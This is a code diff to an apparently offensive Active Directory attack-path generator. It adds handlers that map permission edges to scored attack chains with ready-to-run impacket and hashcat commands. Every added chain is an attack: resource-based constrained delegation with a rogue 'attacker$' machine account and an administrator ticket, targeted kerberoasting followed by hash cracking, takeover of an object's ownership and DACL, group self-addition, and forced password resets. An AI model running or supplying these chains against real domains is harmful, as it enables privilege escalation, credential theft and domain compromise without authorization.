@@ -908,6 +908,82 @@ def run(report, store, ui=None):
                         f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
                         f"-U '{_dom_e}/{_owned}%<password>' -S <DC>",
                     ], src=edge["src"], line=edge["line"]))
+            elif r == "AddAllowedToAct":
+                # iter-51: AddAllowedToAct = write msDS-AllowedToAct-
+                # OnBehalfOfOtherIdentity (RBCD from the target side).
+                # Same primitive as R-RBCD (GenericWrite on computer),
+                # different edge name. Route to R-RBCD chain shape.
+                host_short = tgt.split(".")[0].rstrip("$")
+                fqdn = tgt if "." in tgt else f"{host_short}.{_dom_e}"
+                chains.append(Chain("R-RBCD", "RBCD via AddAllowedToAct",
+                    f"AddAllowedToAct: {actor} -> {tgt} "
+                    f"(direct RBCD -> S4U2self+U2U)",
+                    crit=8, conf=0.75, ready=1.3, prox=0.85,      # score 6.63
+                    commands=[
+                        f"impacket-addcomputer -computer-name 'attacker$' "
+                        f"-computer-pass 'P@ssw0rd!' -dc-host <DC> "
+                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"impacket-rbcd -delegate-from 'attacker$' "
+                        f"-delegate-to '{host_short}$' -action write "
+                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"impacket-getST -spn 'cifs/{fqdn}' "
+                        f"-impersonate administrator "
+                        f"'{_dom_e}/attacker$:P@ssw0rd!'",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "WriteAccountRestrictions":
+                # iter-51: WriteAccountRestrictions = write account UAC
+                # bits + SPN. Route to targeted-kerberoast (same as
+                # WriteSPN since attacker can add an SPN via UAC).
+                chains.append(Chain("R-WRITESPN",
+                    "targeted kerberoast via WriteAccountRestrictions",
+                    f"WriteAccountRestrictions: {actor} -> {tgt} "
+                    f"(set SPN + UAC -> kerberoast)",
+                    crit=7, conf=0.75, ready=1.3, prox=0.85,       # score 5.80
+                    commands=[
+                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '<password>' "
+                        f"-t '{tgt}' -s 'HTTP/kerberoast' <DC>",
+                        f"impacket-GetUserSPNs -request-user '{tgt}' -dc-ip <DC> "
+                        f"'{_dom_e}/{_owned}:<password>' | tee tgs.txt",
+                        "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "AddSelf":
+                # iter-51: AddSelf = add own principal to a group. Common
+                # tier-2 privilege escalation (add to Enterprise Admins etc.).
+                chains.append(Chain("R-ADDSELF", "add-self to group",
+                    f"AddSelf: {actor} -> group {tgt}",
+                    crit=6, conf=0.75, ready=1.3, prox=0.8,       # score 4.68
+                    commands=[
+                        f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
+                        f"-U '{_dom_e}/{_owned}%<password>' -S <DC>",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "Owns":
+                # iter-51: Owns = target's owner. Grant self WriteDacl, then
+                # chain to whatever the target enables (usually ForceChange
+                # or GenericAll).
+                chains.append(Chain("R-OWNS", "reclaim ownership -> full ACL",
+                    f"Owns: {actor} -> {tgt}",
+                    crit=7, conf=0.75, ready=1.2, prox=0.85,       # score 5.36
+                    commands=[
+                        f"# grant self WriteDacl via ownership",
+                        f"impacket-owneredit -action write -new-owner "
+                        f"'{_owned}' -target '{tgt}' "
+                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"impacket-dacledit -action write -rights FullControl "
+                        f"-principal '{_owned}' -target '{tgt}' "
+                        f"'{_dom_e}/{_owned}:<password>'",
+                        f"# then chain to R-WRITEDACL / R-SHADOW / R-RBCD",
+                    ], src=edge["src"], line=edge["line"]))
+            elif r == "AllExtendedRights":
+                # iter-51: AllExtendedRights = includes User-Force-Change-Pw
+                # + Read-GMSA-Pw + Read-LAPS-Pw. Route to ForceChange.
+                chains.append(Chain("R-WRITEDACL",
+                    "AllExtendedRights -> ForceChangePassword",
+                    f"AllExtendedRights: {actor} -> {tgt}",
+                    crit=7, conf=0.8, ready=1.4, prox=0.85,       # score 6.66
+                    commands=[
+                        f"net rpc password '{tgt}' '<NewP@ss123!>' "
+                        f"-U '{_dom_e}/{_owned}%<password>' -S <DC>",
+                    ], src=edge["src"], line=edge["line"]))
             elif r == "WriteSPN":
                 # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
                 # on any user (that itself has no SPN today), then request
